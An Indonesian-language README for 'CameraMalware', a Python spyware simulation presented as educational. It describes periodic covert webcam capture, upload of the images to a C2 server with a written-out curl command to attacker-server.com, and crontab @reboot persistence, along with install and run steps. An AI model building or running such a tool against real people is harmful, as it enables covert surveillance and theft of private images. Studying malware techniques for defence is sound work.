# CameraMalware
CameraMalware adalah sebuah program simulasi malware sederhana yang ditulis dalam Python. Program ini dirancang untuk tujuan edukasi guna memahami cara kerja malware yang dapat mengakses kamera, mengambil gambar secara berkala, mengirimkannya ke server penyerang (C2), serta membuat dirinya tetap berjalan setiap kali sistem dinyalakan (persistence).

⚠️ Peringatan: Program ini hanya untuk pembelajaran dan pengujian keamanan di lingkungan yang sah. Menggunakan kode ini untuk mengakses kamera orang lain tanpa izin adalah ilegal dan tidak etis.

## Fitur
Akses Kamera: Membuka kamera (indeks 0 dan 1) menggunakan OpenCV.

Pengambilan Gambar: Mengambil gambar secara periodik dan menyimpannya dengan nama unik berdasarkan waktu.

Eksfiltrasi Data: Mengirim gambar ke server C2 melalui perintah curl (simulasi).

Persistence: Menambahkan entri ke crontab pengguna agar program berjalan otomatis setiap reboot.

Loop Eksekusi: Berjalan terus-menerus dengan jeda 5 menit antar pengambilan gambar.

## Persyaratan
Python 3.x

Pustaka: opencv-python (cv2)

Sistem operasi berbasis Unix/Linux (karena menggunakan cron dan /tmp)

Koneksi internet (untuk eksfiltrasi)

Instal pustaka yang diperlukan:

bash

Copy

Download
pip install opencv-python
## Instalasi
Clone atau unduh kode program.

Pastikan semua persyaratan terpenuhi.

Sesuaikan URL server C2 pada fungsi exfiltrate_data (baris cmd = ...) jika ingin menguji dengan server sendiri.

Jalankan program:

bash

Copy

Download
python3 camera_malware.py
## Cara Penggunaan
Program akan langsung berjalan setelah dieksekusi. Berikut adalah alurnya:

Program membuat direktori /tmp/captured untuk menyimpan gambar.

Menambahkan dirinya ke crontab agar aktif setiap reboot.

Memasuki loop tak terbatas:

Mencoba mengambil gambar dari kamera indeks 0. Jika gagal, coba indeks 1.

Jika berhasil, gambar disimpan dengan format capture_YYYYMMDD_HHMMSS.jpg.

Gambar dikirim ke server C2 melalui perintah curl.

Menunggu selama 300 detik (5 menit) sebelum mengulang.

Untuk menghentikan program, tekan Ctrl+C di terminal.

## Cara Kerja
### 1. Inisialisasi (__init__)
- Menentukan direktori penyimpanan (/tmp/captured) dan membuatnya jika belum ada.

### 2. capture_image(camera_index)
- Membuka kamera dengan indeks tertentu.

- Membaca satu frame.

- Jika berhasil, menyimpan frame sebagai file JPEG dengan timestamp.

Memanggil exfiltrate_data untuk mengirim file.

Menutup kamera.

### 3. exfiltrate_data(filename)
Menjalankan perintah curl untuk mengunggah file ke server C2.

Perintah: curl -F 'file=@nama_file' http://attacker-server.com/upload

### 4. make_persistent()
Membaca crontab pengguna saat ini.

Jika entri @reboot python3 /path/to/malware.py belum ada, menambahkannya ke file sementara lalu memperbarui crontab.

### 5. run()
Memanggil make_persistent() sekali.

Melakukan loop tak terbatas: mencoba kamera 0, jika gagal coba kamera 1, lalu tidur 300 detik.

## Cat Penting
Edukasi: Program ini dibuat untuk mempelajari teknik dasar malware: akses perangkat keras, penyimpanan data, komunikasi dengan server, dan persistence.

Keamanan: Jangan gunakan di sistem orang lain tanpa izin. Selalu patuhi hukum dan etika.

Pengujian: Jika ingin menguji, gunakan server C2 buatan sendiri (misal dengan nc atau HTTP server sederhana) dan pastikan hanya di lingkungan pribadi.

Perbaikan: Dalam versi nyata, malware biasanya menggunakan enkripsi, penyamaran, dan teknik anti-deteksi. Kode ini hanya contoh sederhana.

## Lisensi
Kode ini disediakan hanya untuk tujuan edukasi. Tidak ada lisensi khusus; Anda bebas mempelajari dan memodifikasinya untuk pembelajaran. Namun, penulis tidak bertanggung jawab atas penyalahgunaan kode ini.

